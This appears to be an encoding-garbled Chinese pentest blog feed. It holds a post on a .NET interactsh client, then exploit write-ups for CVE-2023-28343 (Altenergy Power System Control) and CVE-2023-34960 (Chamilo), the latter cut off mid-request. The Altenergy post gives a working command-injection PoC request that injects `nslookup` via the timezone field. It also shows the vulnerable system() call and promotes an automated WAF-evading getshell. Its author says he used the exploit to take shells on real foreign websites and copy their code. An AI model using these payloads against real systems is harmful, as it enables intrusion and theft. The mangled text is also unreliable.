è§’åº¦çœ‹ä¸€ä¸‹ã€‚ä¼°è®¡æ˜¯è¿™é‡Œçš„é—®é¢˜è¿™é‡Œé¢çš„åŸŸåè¿‡æ—¶äº†å¯ä»¥æ¢æˆæˆ‘è¿™é‡Œå†™çš„åŸŸåç„¶åè¿›è¡Œç¼–è¯‘ã€‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307221256429.png" alt="æ›´æ”¹åŸŸå"><br>ç¼–è¯‘ä»¥åå¦‚ä½•ä½¿ç”¨ã€‚è¿™é‡Œoast.pro é…ç½®ä½ è‡ªå·±çš„åŸŸåæˆ–è€…ä½¿ç”¨å®˜æ–¹æä¾›çš„åŸŸå<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307221258692.png" alt="é…ç½®åŸŸå"><br>ç„¶åæ¥åˆ°logs ç‚¹å‡»ç”Ÿæˆurl ç„¶åè¿›è¡Œæµ‹è¯•å°±è¡Œäº†ã€‚æˆ‘ä»¬åˆšæ‰æ˜¯è¯´äº†å¦‚ä½•ä½¿ç”¨æ¥ä¸‹æ¥æˆ‘ä»¬å°±å¼€å§‹åˆ†æä¸€ä¸‹ä»£ç ã€‚åœ¨BurpExtender è¿™ç±»ä¸­æ˜¯æ’ä»¶çš„å…¥å£ç‚¹<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307221302191.png" alt="å¦‚ä¸‹å›¾"><br>æ¥åˆ°InteractshListener è¿™æ˜¯ç”Ÿæˆ æµ‹è¯•åŸŸåçš„url<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307221305456.png"><br>1:æˆ‘ä»¬çœ‹æ³¨å†Œå®¢æˆ·ç«¯çš„ä»£ç <br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307221307192.png" alt="æ³¨å†Œå®¢æˆ·ç«¯ä»£ç "><br>ç”Ÿæˆå…¬é’¥å¹¶ä¸”è½¬æˆpemæ ¼å¼çš„ã€‚å¹¶ä¸”ç”¨base64æŠŠå…¬é’¥è¿›è¡Œç¼–ç <br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307221308253.png" alt="ç”Ÿæˆå…¬é’¥"><br>ç„¶åè¿™äº›å‘é€åˆ°æœåŠ¡å™¨ç«¯ä½¿ç”¨jsonæ•°æ®ã€‚è‡³äºå¦‚ä½•ç”Ÿæˆè¿™äº›ä¸œè¥¿çš„ä»£ç æˆ‘å°±ä¸åˆ†æäº†ã€‚æˆ‘ä»¬ä¸»è¦çœ‹ä»–è¿™ä¸ªè½¯ä»¶çš„é€»è¾‘ã€‚</p><pre class="language-java" data-language="java"><code class="language-java">registerData<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"public-key"</span><span class="token punctuation">,</span> pubKey<span class="token punctuation">)</span><span class="token punctuation">;</span>registerData<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"secret-key"</span><span class="token punctuation">,</span> secretKey<span class="token punctuation">)</span><span class="token punctuation">;</span>registerData<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"correlation-id"</span><span class="token punctuation">,</span> correlationId<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>2:å¾ªç¯ç­‰å¾…è¯·æ±‚æœåŠ¡ç«¯è·å–æ•°æ®ä»£ç ã€‚å¦‚æœè·å–åˆ°æ•°æ®é‚£ä¹ˆ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">while</span> <span class="token punctuation">(</span>running <span class="token operator">==</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>c<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>       <span class="token keyword">return</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token class-name">TimeUnit</span><span class="token punctuation">.</span>SECONDS<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">burp<span class="token punctuation">.</span></span>BurpExtender</span><span class="token punctuation">.</span>pollTime<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//ä¼‘çœ æ—¶é—´ä½ è®¾ç½®çš„çš„</span><span class="token punctuation">&#125;</span></code></pre><p>3:ä½¿ç”¨ç§é’¥æŠŠaesåŠ å¯†å‡ºæ¥,åœ¨ä½¿ç”¨aeskey è§£å¯†data å±æ€§çš„åŠ å¯†æ•°æ®ã€‚è‡³äºä»€ä¹ˆå¡«å……æ–¹å¼å’Œä»€ä¹ˆçš„æˆ‘å°±ä¸åˆ†æäº†<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307221315033.png" alt="è§£å¯†æ•°æ®"><br>4:è§£å¯†å‡ºæ¥ç„¶ååœ¨ burpæ’ä»¶ä¸Šé¢å±•ç¤ºå‡ºæ¥ã€‚è¿™ä¸ªå¦‚æœç”¨javaå†™å®¢æˆ·ç«¯ç›´æ¥copyä»£ç å°±è¡Œäº†ç›´æ¥å°±å†™å®Œäº†ã€‚æˆ‘ä»¬ä½¿ç”¨.netæ¥å†™æ€»æ‰€å‘¨çŸ¥javaå’Œnet å­—èŠ‚æ•°ç»„ä¸ä¸€æ ·æ‰€ä»¥é€ æˆäº†è¿™éš¾åº¦æ¯”è¾ƒå¤§ã€‚æˆ‘åœ¨chatGptå’Œè°·æ­Œå’Œç™¾åº¦å’Œè‡ªå·±çš„ç†è§£è°ƒæ•´çš„æƒ…å†µä¸‹ç»ˆäºç¼–å†™å‡ºæˆ‘ä»¬çš„å®¢æˆ·ç«¯</p><h2 id="net-å®¢æˆ·ç«¯"><a href="#net-å®¢æˆ·ç«¯" class="headerlink" title=".net å®¢æˆ·ç«¯"></a>.net å®¢æˆ·ç«¯</h2><p>ä¸‹è½½åœ°å€:<a href="https://github.com/peiqiF4ck/interactshCsharpclient">https://github.com/peiqiF4ck/interactshCsharpclient</a><br/><br>åç»­æˆ‘ä»¬å°†æŠŠè¿™ä¸ªæ¢æµ‹æ–¹å¼åŠ å…¥æˆ‘ä»¬çš„webframeworktoolsé‡Œé¢ã€‚nucleiæ¢æµ‹æœ‰æˆ‘ä»¬ä¹Ÿè¦åŠ å…¥ä¸€ä¸‹ã€‚åŸºæœ¬ä¸Šä¸Šé¢æçš„é—®é¢˜æˆ‘ä»¬å…¨éƒ¨ç”¨è¿™ä¸ªè§£å†³äº†ã€‚ç”±äºburpæ’ä»¶ç¼–å†™æˆ‘ä¸ç†Ÿæ‚‰è¿™ä¸ªæ˜¯ä¸»è¦çš„å¦å¤–æˆ‘ä»¬çš„å·¥å…·ä¹Ÿè¦ç”¨è¿™ä¸ªã€‚æˆ‘åœ¨githubä¸­æ‰¾æ²¡æœ‰.netå†™çš„æ’ä»¶ã€‚æ‰€ä»¥æˆ‘å¹²è„†è‡ªå·±å†™ä¸€ä¸ªå®¢æˆ·ç«¯äº†ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307212249255.gif" alt="æ¼”ç¤ºæˆªå›¾"></p>]]></content>
      
      
      <categories>
          
          <category> PenetrationTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PenetrationTestingExample </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Altenergy Power System Controlå‘½ä»¤æ‰§è¡Œæ¼æ´(CVE-2023-28343)å¤ç°</title>
      <link href="/penetrationtest/2023/07/articles/a67e92b61df29d7e/"/>
      <url>/penetrationtest/2023/07/articles/a67e92b61df29d7e/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ€è¿‘çœ‹å…¬ä¼—å·å‘ç°æœ‰ä¸ªæ¼æ´CVE-2023-28343  å‘äº†ä¸€ä¸ªpocæ˜¯ timezone&#x3D;<code>nslookup www.dnslog.cn</code> æˆ‘å¯»æ€è¿™ç©æ„éš¾é“å°±æ˜¯å›æ˜¾ä¸äº†çš„æ‰èƒ½ã€‚äºæ˜¯æˆ‘æ‰¾å›½å¤–ç½‘ç«™è¿›è¡Œå¤ç°ã€‚æ‹¿åˆ°äº†shellå¹¶ä¸”æŠŠä»£ç æ‰“åŒ…äº†ä¸€ä»½ã€‚ä¸‹è½½ä¸‹æ¥ä»”ç»†ç ”ç©¶äº†ä¸€ä¸‹è¿™å¥—ç³»ç»Ÿæ˜¯åŸºäºmvcå¼€å‘çš„ã€‚å‘ç°äº†æ¼æ´ç‚¹ã€‚æˆ‘å°è¯•æ„é€ å›æ˜¾ã€‚æ„é€ æˆåŠŸå°è¯•æ„é€ å†™shellçš„expæ„é€ æˆåŠŸã€‚æˆ‘çœ‹åˆ°æŸäº›æ–‡ç« å’”å’”ä¸€é¡¿å‘ã€‚è·Ÿé£å¤§éƒ¨åˆ†éƒ½æ˜¯è¿™ä¸ªpocã€‚ã€‚ã€‚äºæ˜¯ä¹æœ‰äº†è¿™ç¯‡æ–‡ç« ã€‚æˆ‘çœ‹githubè€å¤–ä¹Ÿæ˜¯æ˜¯åå¼¹shellçš„ã€‚æˆ‘ä»¬èƒ½ç›´æ¥getshell ç»ä¸åå¼¹shellã€‚</p><p>poc </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span> <span class="token operator">/</span>index<span class="token operator">.</span>php<span class="token operator">/</span>management<span class="token operator">/</span>set_timezone <span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span>Host<span class="token punctuation">:</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span>User<span class="token operator">-</span>Agent<span class="token punctuation">:</span> Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span>Windows <span class="token constant">NT</span> <span class="token number">5.1</span><span class="token punctuation">)</span> AppleWebKit<span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span><span class="token constant">KHTML</span><span class="token punctuation">,</span> like Gecko<span class="token punctuation">)</span> Chrome<span class="token operator">/</span><span class="token number">35.0</span><span class="token number">.2309</span><span class="token number">.372</span> Safari<span class="token operator">/</span><span class="token number">537.36</span>Connection<span class="token punctuation">:</span> closeContent<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">62</span>Accept<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> gzip<span class="token punctuation">,</span> deflateContent<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded<span class="token punctuation">;</span> charset<span class="token operator">=</span><span class="token constant">UTF</span><span class="token operator">-</span><span class="token number">8</span>Referer<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token comment">//127.0.0.1/index.php/management/datetime</span><span class="token constant">X</span><span class="token operator">-</span>Requested<span class="token operator">-</span>With<span class="token punctuation">:</span> XMLHttpRequesttimezone<span class="token operator">=</span><span class="token string backtick-quoted-string">`nslookup dns`</span></code></pre><h2 id="æ¼æ´èµ·å› "><a href="#æ¼æ´èµ·å› " class="headerlink" title="æ¼æ´èµ·å› "></a>æ¼æ´èµ·å› </h2><p>æ¼æ´æ–‡ä»¶ï¼šhome\local_web\pages\application\controllers\management.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">set_timezone</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">//æ¼æ´å‡½æ•°</span><span class="token punctuation">&#123;</span>      <span class="token variable">$results</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">management_model</span><span class="token operator">-></span><span class="token function">set_timezone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//æ¼æ´ç‚¹</span>    <span class="token variable">$results</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"message"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lang</span><span class="token operator">-></span><span class="token function">line</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"timezone_result_&#123;$results["</span>value<span class="token string double-quoted-string">"]&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$results</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>ç»§ç»­è¿½è¸ªä»£ç <br>\home\local_web\pages\application\models\management_model.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">/* è®¾ç½®æ—¶åŒº */</span>   <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">set_timezone</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>       <span class="token variable">$results</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">//è·å–é¡µé¢é€‰æ‹©çš„æ—¶åŒº </span>       <span class="token variable">$timezone</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">input</span><span class="token operator">-></span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'timezone'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//å¯æ§ç‚¹</span>       <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$timezone</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>       <span class="token variable">$timezone</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Asia/Taipei"</span><span class="token punctuation">;</span>       <span class="token comment">//è®¾ç½®linuxç³»ç»Ÿæ—¶åŒº</span>       <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"cp /usr/share/zoneinfo/<span class="token interpolation"><span class="token variable">$timezone</span></span> /etc/localtime"</span><span class="token punctuation">;</span> <span class="token comment">//æ¼æ´ç‚¹</span>       <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//æ¼æ´è§¦å‘ç‚¹</span>       <span class="token comment">//å°†æ—¶åŒºä¿å­˜åˆ°é…ç½®æ–‡ä»¶</span>       <span class="token variable">$fp</span> <span class="token operator">=</span> @<span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/etc/yuneng/timezone.conf"</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>           <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token variable">$timezone</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span>       <span class="token comment">//è®¡ç®—ECUæœ¬åœ°æ—¶é—´å¹¶å­˜å…¥æ—¶é’ŸèŠ¯ç‰‡</span>       <span class="token function">date_default_timezone_set</span><span class="token punctuation">(</span><span class="token variable">$timezone</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token variable">$localtime_assoc</span> <span class="token operator">=</span> <span class="token function">localtime</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token variable">$local_time</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%04d%02d%02d%02d%02d%02d"</span><span class="token punctuation">,</span>                           <span class="token variable">$localtime_assoc</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tm_year'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1900</span><span class="token punctuation">,</span>                           <span class="token variable">$localtime_assoc</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tm_mon'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>                           <span class="token variable">$localtime_assoc</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tm_mday'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                           <span class="token variable">$localtime_assoc</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tm_hour'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                           <span class="token variable">$localtime_assoc</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tm_min'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                           <span class="token variable">$localtime_assoc</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tm_sec'</span><span class="token punctuation">]</span>                           <span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token variable">$fp</span> <span class="token operator">=</span> @<span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/dev/rtc2"</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>           <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token variable">$local_time</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span>       <span class="token comment">//é‡å¯ä¸»å‡½æ•°å’Œå®¢æˆ·ç«¯å‡½æ•°</span>       <span class="token comment">//system("/home/application/ntpapp.exe");</span>       <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"killall main.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"killall client"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token variable">$results</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"value"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>         <span class="token comment">/* å°†ECUæœ¬åœ°é¡µé¢å˜åŠ¨æ•°æ®å­˜å…¥æ•°æ®åº“ */</span>       <span class="token comment">//ECU_id</span>       <span class="token variable">$ecuid</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"000000000000"</span><span class="token punctuation">;</span>       <span class="token variable">$fp</span> <span class="token operator">=</span> @<span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/etc/yuneng/ecuid.conf"</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span>       <span class="token punctuation">&#123;</span>           <span class="token variable">$ecuid</span> <span class="token operator">=</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span>       <span class="token comment">//åˆå§‹åŒ–æ¶ˆæ¯ä½“</span>       <span class="token variable">$record</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"APS1300000A104AAA0"</span><span class="token operator">.</span><span class="token variable">$ecuid</span><span class="token operator">.</span><span class="token variable">$local_time</span><span class="token operator">.</span><span class="token string double-quoted-string">"00000000000000"</span><span class="token operator">.</span><span class="token variable">$timezone</span><span class="token operator">.</span><span class="token string double-quoted-string">"END"</span><span class="token punctuation">;</span>       <span class="token comment">//è®¡ç®—æ¶ˆæ¯é•¿åº¦å¹¶åŠ ä¸Šå›è½¦ç¬¦å·</span>       <span class="token variable">$record_length</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%05d"</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$record</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token variable">$record</span> <span class="token operator">=</span> <span class="token function">substr_replace</span><span class="token punctuation">(</span><span class="token variable">$record</span><span class="token punctuation">,</span> <span class="token variable">$record_length</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token variable">$record</span> <span class="token operator">=</span> <span class="token variable">$record</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>       <span class="token comment">//å°†æ¶ˆæ¯ä¿å­˜åˆ°æ•°æ®åº“</span>       <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"REPLACE INTO process_result (item, result, flag) VALUES(104, '<span class="token interpolation"><span class="token variable">$record</span></span>', 1)"</span><span class="token punctuation">;</span>       <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">pdo</span><span class="token operator">-></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">return</span> <span class="token variable">$results</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span></code></pre><p>ä»ä¸Šé¢ä»£ç æˆ‘ä»¬çŸ¥é“æ¼æ´åœ¨å¦‚ä½•æ„é€ å›æ˜¾exp linuxçš„å°±ä½ ä»¬äº†ã€‚</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//è®¾ç½®linuxç³»ç»Ÿæ—¶åŒº</span>  <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"cp /usr/share/zoneinfo/<span class="token interpolation"><span class="token variable">$timezone</span></span> /etc/localtime"</span><span class="token punctuation">;</span>  <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="å›æ˜¾expå®æˆ˜"><a href="#å›æ˜¾expå®æˆ˜" class="headerlink" title="å›æ˜¾expå®æˆ˜"></a>å›æ˜¾expå®æˆ˜</h2><p>å›æ˜¾å®æˆ˜<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307141635244.png" alt="å›æ˜¾"></p><h2 id="æ­¦å™¨åŒ–è‡ªåŠ¨åŒ–getshell"><a href="#æ­¦å™¨åŒ–è‡ªåŠ¨åŒ–getshell" class="headerlink" title="æ­¦å™¨åŒ–è‡ªåŠ¨åŒ–getshell"></a>æ­¦å™¨åŒ–è‡ªåŠ¨åŒ–getshell</h2><p>è€å¤–å†™çš„æ˜¯æ‰§è¡Œå‘½ä»¤çš„æˆ‘ä»¬ç›´æ¥ä¸Šshellã€‚è¿™ä¸ªgetshellç¨å¾®æœ‰ç‚¹åå·ã€‚å› ä¸ºè¿™ä¸ªç«™ç‚¹æœ‰wafğŸ¤£ã€‚æ‰€ä»¥æˆ‘ä»¬çš„è½¯ä»¶å¤§éƒ¨åˆ†æ¼æ´åŸºæœ¬éƒ½æ˜¯å®æˆ˜åå†™çš„expã€‚æ‰€ä»¥å¯¹æ¯”åŒè½¯ä»¶æ¥è¯´æˆ‘ä»¬å¾ˆæœ‰ä¼˜åŠ¿ã€‚åç»­å°†ä¸“æ³¨è‡ªåŠ¨åŒ–å¯¹æŠ—waf æ‰¹é‡ä¸€é”®getshell å¯¹å·²ç»çš„æ¼æ´èƒ½ç›´æ¥æ‹¿æƒé™çš„ç›´æ¥æ‹¿æƒé™ã€‚æ›´æ–°è¯¦æƒ…ã€‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307141638708.png" alt="è‡ªåŠ¨åŒ–getshell"></p>]]></content>
      
      
      <categories>
          
          <category> PenetrationTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PenetrationTestingExample </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>â€‹Chamiloå‘½ä»¤æ‰§è¡Œæ¼æ´(CVE-2023-34960)å¤ç°</title>
      <link href="/penetrationtest/2023/07/articles/3a5c54b2df6ebaf1/"/>
      <url>/penetrationtest/2023/07/articles/3a5c54b2df6ebaf1/</url>
      
        <content type="html"><![CDATA[<h2 id="äº§å“ä»‹ç»"><a href="#äº§å“ä»‹ç»" class="headerlink" title="äº§å“ä»‹ç»"></a>äº§å“ä»‹ç»</h2><p>  Chamiloæ˜¯ä¸€ä¸ªå¼€æºçš„åœ¨çº¿å­¦ä¹ å’Œå†…å®¹ç®¡ç†ç³»ç»Ÿï¼Œä¸“æ³¨äºæ˜“ç”¨æ€§å’Œå¯è®¿é—®æ€§ã€‚</p><h2 id="æ¼æ´ä»‹ç»"><a href="#æ¼æ´ä»‹ç»" class="headerlink" title="æ¼æ´ä»‹ç»"></a>æ¼æ´ä»‹ç»</h2><p>Chamiloæ˜¯ä¸€æ¬¾å¯ä¾›ç”¨æˆ·å…è´¹ä¸‹è½½çš„å­¦ä¹ ç®¡ç†è½¯ä»¶ï¼Œå…¶ç›®çš„æ˜¯æé«˜æ¥è‡ªå¼±åŠ¿èƒŒæ™¯çš„ç”¨æˆ·å¯¹åœ¨çº¿è¯¾ç¨‹çš„å¯åŠæ€§ã€‚Chamiloç”±ä¸€ä¸ªåä¸ºChamiloåä¼šçš„éè¥åˆ©ç»„ç»‡è¿è¡Œå’Œç®¡ç†ã€‚Chamiloå­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œæ¶æ„æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ çš„xmlæ–‡ä»¶ä»»æ„å‘½ä»¤ï¼Œè¿›è€Œæ§åˆ¶æœåŠ¡å™¨</p><h2 id="æ¼æ´poc"><a href="#æ¼æ´poc" class="headerlink" title="æ¼æ´poc"></a>æ¼æ´poc</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span> <span class="token operator">/</span>main<span class="token operator">/</span>webservices<span class="token operator">/</span>additional_webservices<span class="token operator">.</span>php <span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span>Host<span class="token punctuation">:</span> www<span class="token operator">.</span>xxx<span class="token operator">.</span>comUser<span class="token operator">-</span>Agent<span class="token punctuation">:</span> Mozilla<span class="token operator">/</span><span class="token number">4.0</span> <span class="token punctuation">(</span>compatible<span class="token punctuation">;</span> <span class="token constant">MSIE</span> <span class="token number">8.0</span><span class="token punctuation">;</span> Windows <span class="token constant">NT</span> <span class="token number">6.1</span><span class="token punctuation">)</span>Accept<span class="token punctuation">:</span> <span class="token operator">*</span><span class="token operator">/</span><span class="token operator">*</span>Connection<span class="token punctuation">:</span> Keep<span class="token operator">-</span>AliveContent<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">826</span>Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded<span class="token operator">&lt;</span><span class="token constant">SOAP</span><span class="token operator">-</span><span class="token constant">ENV</span><span class="token punctuation">:</span>Envelope xmlns<span class="token punctuation">:</span><span class="token constant">SOAP</span><span class="token operator">-</span><span class="token constant">ENV</span><span class="token operator">=</span><span class="token string double-quoted-string">"http://schemas.xmlsoap.org/soap/envelope/"</span> xmlns<span class="token punctuation">:</span>ns1<span class="token operator">=</span><span class="token string double-quoted-string">"&#123;http://ip:port&#125;"</span> xmlns<span class="token punctuation">:</span>xsi<span class="token operator">=</span><span class="token string double-quoted-string">"http://www.w3.org/2001/XMLSchema-instance"</span> xmlns<span class="token punctuation">:</span>xsd<span class="token operator">=</span><span class="token string double-quoted-string">"http://www.w3.org/2001/XMLSchema"</span> xmlns<span class="token punctuation">:</span>ns2<span class="token operator">=</span><span class="token string double-quoted-string">"http://xml.apache.org/xml-soap"</span> xmlns<span class="token punctuation">:</span><span class="token constant">SOAP</span><span class="token operator">-</span><span class="token constant">ENC</span><span class="token operator">=</span><span class="token string double-quoted-string">"http://schemas.xmlsoap.org/soap/encoding/"</span> <span class="token constant">SOAP</span><span class="token operator">-</span><span class="token constant">ENV</span><span class="token punctuation">:</span>encodingStyle<span class="token operator">=</span><span class="token string double-quoted-string">"http://schemas.xmlsoap.org/soap/encoding/"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token constant">SOAP</span><span class="token operator">-</span><span class="token constant">ENV</span><span class="token punctuation">:</span>Body<span class="token operator">></span><span class="token operator">&lt;</span>ns1<span class="token punctuation">:</span>wsConvertPpt<span class="token operator">></span><span class="token operator">&lt;</span>param0 xsi<span class="token punctuation">:</span>type<span class="token operator">=</span><span class="token string double-quoted-string">"ns2:Map"</span><span class="token operator">></span><span class="token operator">&lt;</span>item<span class="token operator">></span><span class="token operator">&lt;</span>key xsi<span class="token punctuation">:</span>type<span class="token operator">=</span><span class="token string double-quoted-string">"xsd:string"</span><span class="token 